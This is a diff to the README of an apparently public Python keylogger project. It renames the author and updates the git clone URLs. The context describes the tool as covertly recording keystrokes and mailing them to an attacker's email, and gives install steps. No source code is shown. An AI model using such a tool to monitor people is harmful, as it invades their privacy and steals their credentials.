@@ -1,5 +1,5 @@
 # KeyLogger
-## Raghuram \\\ Stagefright
+## Raghuram \\\ Compromyse
 
 **Keystroke logging**, often referred to as **keylogging** or keyboard capturing, is the action of **recording** the keys struck on a keyboard, typically covertly, so that a person using the keyboard is unaware that their actions are being **monitored**. Data can then be retrieved by the person operating the logging program.
 
@@ -14,7 +14,7 @@ This keylogger logs keyboard input and mails it to an email of the attackers cho
 * Install python3 from https://python.org and git from https://git-scm.com.
 * Clone the repository
 ```bash
-git clone https://Stagefright071/KeyLogger
+git clone https://github.com/compromyse/KeyLogger
 ```
 * Install python requirements
 ```bash
@@ -41,7 +41,7 @@ arch: $ sudo pacman -S python python-pip git
 ```
 * Clone the repository
 ```bash
-git clone https://Stagefright071/KeyLogger
+git clone https://github.com/compromyse/KeyLogger
 ```
 * Install python requirements
 ```bash
